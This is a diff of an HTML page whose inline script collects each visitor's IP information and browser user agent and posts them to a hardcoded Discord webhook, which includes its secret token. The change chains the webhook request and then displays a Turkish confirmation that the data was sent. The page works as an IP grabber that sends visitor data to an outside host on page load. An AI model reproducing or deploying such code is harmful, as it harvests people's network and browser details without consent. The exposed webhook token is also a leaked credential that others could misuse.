@@ -40,6 +40,9 @@
 
 
 
+ 
+    <div id="info"></div>
+
     <script>
         const webhookUrl = 'https://discord.com/api/webhooks/1087713151128195093/UbcPhw2mutKedM_sLv_2P3LwAWhCa565LKpBaPvkDtYNKoGExTk8Zvpb7HpL3EB__tkA';
 
@@ -71,20 +74,26 @@
                   const userAgent = navigator.userAgent;
                   message += `Tarayıcı bilgisi: ${userAgent}\n`;
 
-                  fetch(webhookUrl, {
+                  return fetch(webhookUrl, {
                       method: 'POST',
                       headers: {
                           'Content-Type': 'application/json'
                       },
                       body: JSON.stringify({ content: message })
                   });
-
-                  document.getElementById('info').innerText = message;
               } else {
                   document.getElementById('info').innerText = 'IP bilgileri alınamadı.';
               }
+          })
+          .then(() => {
+              document.getElementById('info').innerText = 'IP ve tarayıcı bilgileri gönderildi.';
+          })
+          .catch(error => {
+              console.error('Hata:', error);
           });
     </script>
+</body>
+</html>
 
 
 
